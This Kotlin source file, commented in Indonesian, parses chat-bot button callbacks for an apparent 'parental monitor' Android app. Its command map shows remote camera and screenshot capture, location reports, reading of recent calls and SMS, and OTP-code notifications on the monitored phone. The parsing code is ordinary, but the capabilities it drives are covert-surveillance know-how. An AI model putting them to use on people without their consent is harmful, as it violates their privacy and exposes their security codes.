package com.redeye.parentalmonitor.utils

import java.util.Locale

sealed class MenuCallback {
    data class Navigate(val view: String, val editInPlace: Boolean) : MenuCallback()
    data class Run(val command: String) : MenuCallback()
    // Segarkan (kemudahan pakai, keputusan pemilik
    // 2026-11-12): tombol di bawah balasan laporan yang
    // mengedit pesan yang sama dengan data terbaru, bukan
    // mengirim pesan baru. Hanya laporan baca-saja murah
    // yang boleh disegarkan; daftar di REFRESH_COMMANDS.
    data class Refresh(val command: String) : MenuCallback()
    // Jepret ulang (permintaan pemilik 2026-11-14): tombol di
    // bawah foto kamera / tangkapan layar yang menjepret ulang
    // lalu MENIMPA media di pesan yang sama (editMessageMedia),
    // bukan mengirim pesan baru — tak perlu menggulir. mode:
    // "b" = lensa belakang, "f" = lensa depan, "s" = tangkapan
    // layar. Mode di luar daftar ditolak parser.
    data class JepretUlang(val mode: String) : MenuCallback()
    data class AskInput(val command: String, val view: String) : MenuCallback()
    // harapan (issue #902): keadaan yang TERTULIS di label saat
    // tombol dibuat ("1"=NYALA, "0"=MATI). Bila keadaan aktual
    // sudah berbeda saat tombol ditekan (menu lama), saklar
    // tidak membalik — hanya menyegarkan tampilan. Data format
    // lama tanpa potongan ini -> null (perilaku balik seperti
    // biasa agar menu lama tetap berfungsi).
    data class Toggle(val key: String, val view: String, val harapan: Boolean? = null) : MenuCallback()

    companion object {
        val VIEWS = setOf("main", "media", "lokasi", "komu", "info", "pantau", "alat")

        // Kunci saklar on/off (permintaan owner: tombol toggle di
        // menu, tak perlu ketik "/notify off"). Kunci di luar daftar
        // ini ditolak parser agar data callback liar tak bisa
        // membalik setelan apa pun.
        val TOGGLE_KEYS = setOf("notify", "otp", "patrol", "night", "appalert", "appwatch", "protect", "datasaver")

        // Laporan yang boleh disegarkan di tempat lewat
        // tombol "segar:<perintah>": baca-saja, murah, dan
        // teksnya dibangun ulang penuh tiap penyegaran.
        val REFRESH_COMMANDS = setOf("status", "battery", "storage")

        // Sengaja tidak private (issue #903): uji mengunci tiap
        // nilai peta ini ke kepala perintah yang hidup di
        // CommandSuggest.KNOWN_COMMANDS — persis jalan lolosnya
        // tombol "cekmati" yang mati pada #898.
        val LEGACY = mapOf(
            "photo" to "photo",
            "location" to "location",
            "lastcalls" to "lastcalls",
            "lastsms" to "lastsms",
            "battery" to "battery",
            "status" to "status",
            "stop" to "stop",
            "resume" to "resume",
            "camfront" to "camera front",
            "camback" to "camera back",
            "pause60" to "pause 60",
            "shot" to "screenshot",
            "cekmati" to "checkdead",
            "alive" to "alive"
        )

        fun viewName(name: String): String = if (name in VIEWS) name else "main"

        // Pemetaan kunci saklar -> perintah ketik (issue #903):
        // dipindah ke sini dari MonitoringService agar murni dan
        // terkunci uji — tiap kunci wajib menghasilkan perintah
        // yang kepalanya dikenal CommandSuggest.
        fun toggleCommand(key: String, nyala: Boolean): String? {
            val arah = if (nyala) "on" else "off"
            return when (key) {
                "notify" -> "/notify $arah"
                "otp" -> "/notify otp $arah"
                "patrol" -> "/patrol $arah"
                "night" -> "/night $arah"
                "appalert" -> "/appalert $arah"
                "appwatch" -> "/appwatch $arah"
                "protect" -> "/protect $arah"
                "datasaver" -> "/datasaver $arah"
                else -> null
            }
        }

        fun parse(data: String): MenuCallback? {
            val raw = data.trim()
            if (raw.isEmpty()) return null
            if (raw == "menu:open") return Navigate("main", false)
            if (raw == "menu:angka") return Navigate("main", false)
            if (raw.startsWith("m:")) return Navigate(viewName(raw.removePrefix("m:").trim()), true)
            if (raw.startsWith("segar:")) {
                val command = perintah(raw.removePrefix("segar:"))
                return if (command in REFRESH_COMMANDS) Refresh(command) else null
            }
            if (raw.startsWith("refoto:")) {
                val mode = raw.removePrefix("refoto:").trim().lowercase(Locale.ROOT)
                return if (mode == "b" || mode == "f") JepretUlang(mode) else null
            }
            if (raw == "reshot") return JepretUlang("s")
            if (raw.startsWith("x:")) {
                val command = perintah(raw.removePrefix("x:"))
                return if (command.isEmpty()) null else Run(command)
            }
            if (raw.startsWith("tg:")) {
                val isi = raw.removePrefix("tg:")
                val pisah = isi.indexOf(':')
                if (pisah < 0) return null
                val sisa = isi.substring(pisah + 1).trim().lowercase(Locale.ROOT)
                val pisah2 = sisa.indexOf(':')
                val key = if (pisah2 < 0) sisa else sisa.substring(0, pisah2).trim()
                if (key !in TOGGLE_KEYS) return null
                val harapan = if (pisah2 < 0) null else when (sisa.substring(pisah2 + 1).trim()) {
                    "1" -> true
                    "0" -> false
                    else -> null
                }
                return Toggle(key, viewName(isi.substring(0, pisah).trim()), harapan)
            }
            val angka = raw.startsWith("num:")
            if (angka || raw.startsWith("i:")) {
                val isi = raw.substringAfter(":")
                if (isi.trim() == "menu") return Navigate("main", false)
                val pisah = isi.indexOf(':')
                if (pisah < 0) {
                    val command = perintah(isi)
                    if (command.isEmpty()) return null
                    return AskInput(command, "")
                }
                val command = perintah(isi.substring(pisah + 1))
                if (command.isEmpty()) return null
                val nama = isi.substring(0, pisah).trim()
                val asal = if (nama in VIEWS) nama else ""
                return AskInput(command, asal)
            }
            return LEGACY[raw]?.let { Run(it) }
        }

        private fun perintah(teks: String): String {
            val bersih = teks.trim().removePrefix("/").trim()
            if (bersih.isEmpty()) return ""
            val spasi = bersih.indexOf(' ')
            if (spasi < 0) return bersih.lowercase(Locale.ROOT)
            val kepala = bersih.substring(0, spasi).lowercase(Locale.ROOT)
            val ekor = bersih.substring(spasi + 1).trim()
            return if (ekor.isEmpty()) kepala else kepala + " " + ekor
        }
    }
}
